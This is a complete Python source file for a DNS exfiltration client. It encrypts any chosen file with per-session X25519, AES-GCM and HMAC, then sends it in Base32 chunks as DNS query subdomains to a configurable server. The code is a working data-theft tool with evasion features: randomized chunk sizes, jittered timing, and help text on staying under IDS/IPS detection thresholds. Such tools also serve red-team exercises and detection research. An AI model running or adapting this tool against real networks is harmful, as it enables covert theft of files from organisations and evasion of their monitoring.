#!/usr/bin/env python3
"""
Module Name: client.py

Description:
    DNS exfiltration client with per-session ephemeral key exchange,
    AES-GCM encryption, Base32 encoding, and HMAC integrity.

    - Generates an ephemeral X25519 keypair per transfer.
    - Sends client pubkey via TXT query, receives server ephemeral pubkey
      in TXT response (true PFS — no persistent keys on either side).
    - Derives per-transfer AES and HMAC keys via ECDH + HKDF.
    - Encrypts file with AES-GCM, appends HMAC tag, Base32-encodes.
    - Splits into DNS-safe chunks and sends as A-query subdomains.

Author: John Burns
Date: 2025-05-02
Version: 3.0 (Per-session ephemeral keys)
"""

import argparse
import base64
import hashlib
import hmac
import logging
import math
import os
import random
import socket
import sys
import time
from uuid import uuid4

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey, Ed25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from dnslib import DNSRecord, DNSQuestion, QTYPE

# Setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('client')

# Constants
MAX_RETRIES = 3


def load_signing_key(path):
    """Load an Ed25519 private key from a raw 32-byte seed file."""
    with open(path, 'rb') as f:
        seed = f.read()
    return Ed25519PrivateKey.from_private_bytes(seed)


def load_identity_pubkey(path):
    """Load an Ed25519 public key from a raw 32-byte file."""
    with open(path, 'rb') as f:
        pub_bytes = f.read()
    return Ed25519PublicKey.from_public_bytes(pub_bytes)


def compute_fingerprint(pub_key):
    """Compute 8-byte fingerprint = SHA256(raw_pubkey)[:8]."""
    pub_bytes = pub_key.public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw
    )
    return hashlib.sha256(pub_bytes).digest()[:8]


def derive_shared_keys(client_priv, server_pub_bytes):
    """
    Perform ECDH and derive AES-GCM key and HMAC key.
    Returns (aes_key, hmac_key).
    """
    server_pub = x25519.X25519PublicKey.from_public_bytes(server_pub_bytes)
    shared = client_priv.exchange(server_pub)
    material = HKDF(algorithm=hashes.SHA256(), length=48, salt=None, info=b'dns-exfil').derive(shared)
    return material[:32], material[32:]


def encrypt_and_hmac(file_path, aes_key, hmac_key):
    """
    Read file, encrypt with AES-GCM, append HMAC-SHA256 tag.
    Returns raw bytes.
    """
    with open(file_path, 'rb') as f:
        plaintext = f.read()

    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data=None)

    tag = hmac.new(hmac_key, nonce + ciphertext, hashlib.sha256).digest()
    return nonce + ciphertext + tag


def base32_encode(data):
    """
    Base32-encode and strip padding.
    """
    b32 = base64.b32encode(data).decode('ascii')
    return b32.rstrip('=')


def chunk_payload(b32_string, identifier, *, min_size=16, max_label_len=52):
    """
    Split Base32 string into DNS-safe subdomain labels of the form
      <identifier>-<idx>-<total>-<chunk>
    with each label <= max_label_len characters and chunk lengths randomized
    between min_size and the per-label maximum.
    """

    # Estimate total segments if we used min_size chunks,
    # so we know how many digits "total" will consume.
    est_segments = max(1, math.ceil(len(b32_string) / min_size))
    tot_digits = len(str(est_segments))

    segments = []
    pos = 0
    idx = 0

    # First pass: carve out all the data-chunks
    while pos < len(b32_string):
        idx_digits = len(str(idx))
        # overhead = len(id) + digits(idx) + digits(total) + 3 hyphens
        overhead = len(identifier) + idx_digits + tot_digits + 3
        available = max_label_len - overhead
        if available < min_size:
            raise ValueError(f"max_label_len={max_label_len} too small for min_size={min_size}")
        # pick a random size in [min_size, available]
        size = random.randint(min_size, available)
        segments.append(b32_string[pos:pos + size])
        pos += size
        idx += 1

    total = len(segments)

    # Second pass: yield the properly formatted labels
    for idx, seg in enumerate(segments):
        yield f"{identifier}-{idx}-{total}-{seg}"


def send_query(subdomain, args):
    """
    Send a single DNS A query.
    Returns True on success.
    """
    fqdn = f"{subdomain}.{args.domain}"
    q = DNSRecord(q=DNSQuestion(fqdn, QTYPE.A))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    try:
        sock.sendto(q.pack(), (args.server_ip, args.server_port))
        resp, _ = sock.recvfrom(512)
        logger.debug(f"Response: {DNSRecord.parse(resp)}")
        return True
    except Exception as e:
        logger.warning(f"Query failed for {subdomain}: {e}")
        return False
    finally:
        sock.close()


def reliable_send(subdomain, args):
    """
    Attempt to send DNS query with retries.
    """
    for attempt in range(1, MAX_RETRIES + 1):
        if send_query(subdomain, args):
            logger.info(f"Sent {subdomain} successfully")
            return True
        logger.info(f"Retry {attempt} for {subdomain}")
    return False


def perform_key_exchange(identifier, args, signing_key=None, server_identity_pubkey=None):
    """
    Generate ephemeral client keypair, send pubkey as TXT query,
    receive server's ephemeral pubkey from TXT response, derive shared keys.

    If signing_key is provided, the client signs its ephemeral pubkey and
    appends the signature + fingerprint to the key exchange payload.
    If server_identity_pubkey is provided, the client verifies the server's
    Ed25519 signature on its ephemeral pubkey.

    Returns (aes_key, hmac_key).
    """
    client_priv = x25519.X25519PrivateKey.generate()
    pub_bytes = client_priv.public_key().public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw
    )

    # Build key exchange payload: pubkey alone (32B) or pubkey + sig + fingerprint (104B)
    if signing_key:
        signature = signing_key.sign(pub_bytes)
        fingerprint = compute_fingerprint(signing_key.public_key())
        kex_payload = pub_bytes + signature + fingerprint  # 32 + 64 + 8 = 104 bytes
        logger.info(f"[{identifier}] Signing ephemeral key for authentication")
    else:
        kex_payload = pub_bytes

    b32_pub = base32_encode(kex_payload)

    # Split payload across DNS labels to stay within 63-char label limit.
    # First label: <id>-0-0-<part1>, remaining parts as additional labels.
    header = f"{identifier}-0-0-"
    max_first = 63 - len(header)
    labels = [header + b32_pub[:max_first]]
    rest = b32_pub[max_first:]
    while rest:
        labels.append(rest[:63])
        rest = rest[63:]
    subdomain = '.'.join(labels)
    fqdn = f"{subdomain}.{args.domain}"

    for attempt in range(1, MAX_RETRIES + 1):
        q = DNSRecord(q=DNSQuestion(fqdn, QTYPE.TXT))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        try:
            sock.sendto(q.pack(), (args.server_ip, args.server_port))
            resp_data, _ = sock.recvfrom(512)
            resp = DNSRecord.parse(resp_data)

            # Parse server's ephemeral pubkey from TXT response
            for rr in resp.rr:
                if rr.rtype == QTYPE.TXT:
                    txt = str(rr.rdata).strip('"')
                    pad_len = (8 - len(txt) % 8) % 8
                    txt_padded = txt + '=' * pad_len
                    response_bytes = base64.b32decode(txt_padded)

                    if len(response_bytes) == 96 and server_identity_pubkey:
                        # Authenticated response: 32B pubkey + 64B signature
                        server_pub_bytes = response_bytes[:32]
                        server_sig = response_bytes[32:]
                        try:
                            server_identity_pubkey.verify(server_sig, server_pub_bytes)
                            logger.info(f"[{identifier}] Server identity VERIFIED — TRUSTED")
                        except Exception:
                            logger.warning(f"[{identifier}] Server signature verification FAILED — UNAUTHENTICATED")
                    elif len(response_bytes) == 96 and not server_identity_pubkey:
                        server_pub_bytes = response_bytes[:32]
                        logger.warning(f"[{identifier}] Server sent signed response but no identity pubkey configured — UNAUTHENTICATED")
                    else:
                        # Unauthenticated response: 32B pubkey only
                        server_pub_bytes = response_bytes
                        if server_identity_pubkey:
                            logger.warning(f"[{identifier}] Server did not sign response — UNAUTHENTICATED")
                        else:
                            logger.info(f"[{identifier}] Key exchange completed — UNAUTHENTICATED")

                    logger.info(f"Received server ephemeral pubkey for session {identifier}")
                    return derive_shared_keys(client_priv, server_pub_bytes)

            logger.warning(f"No TXT record in response, attempt {attempt}")
        except Exception as e:
            logger.warning(f"Key exchange query failed (attempt {attempt}): {e}")
        finally:
            sock.close()

    raise RuntimeError("Key exchange failed after all retries")


def main(args):
    identifier = uuid4().hex[:8]

    # Load optional authentication keys
    signing_key = load_signing_key(args.signing_key) if args.signing_key else None
    server_identity_pubkey = load_identity_pubkey(args.server_identity_pubkey) if args.server_identity_pubkey else None

    # Key exchange
    aes_key, hmac_key = perform_key_exchange(identifier, args, signing_key, server_identity_pubkey)
    logger.info(f"Keys established for session {identifier}")

    # Encrypt, HMAC, Base32
    raw_blob = encrypt_and_hmac(args.file_path, aes_key, hmac_key)
    b32 = base32_encode(raw_blob)
    logger.debug(f"Base32 length: {len(b32)}")

    # Send data chunks
    failures = []
    for sub in chunk_payload(b32, identifier):
        time.sleep(random.uniform(args.low, args.high) / 1000.0)
        if not reliable_send(sub, args):
            failures.append(sub)

    if failures:
        logger.error(f"Failed chunks: {failures}")
        sys.exit(1)
    logger.info("All chunks sent successfully")


def parse_args():
    p = argparse.ArgumentParser(description="DNS Exfiltration Client (Ephemeral ECDH + AES-GCM + HMAC)")
    p.add_argument('--server-ip', default='127.0.0.1')
    p.add_argument('--server-port', type=int, default=5300)
    p.add_argument('--file-path', required=True)
    p.add_argument('--domain', default='xf.example.com')
    p.add_argument('--low', type=int, default=500,
                   help='Reducing the minimum delay below 500ms may trigger IDS/IPS, rate limiting, or other actions to protect dns servers.')
    p.add_argument('--high', type=int, default=1000,
                   help='Should be adjusted to maintain a QPS of 1-2 queries per second.')
    p.add_argument('--signing-key', default=None,
                   help='Path to client Ed25519 private key for authentication')
    p.add_argument('--server-identity-pubkey', default=None,
                   help='Path to server Ed25519 public key for verifying server identity')

    return p.parse_args()


if __name__ == '__main__':
    args = parse_args()
    main(args)
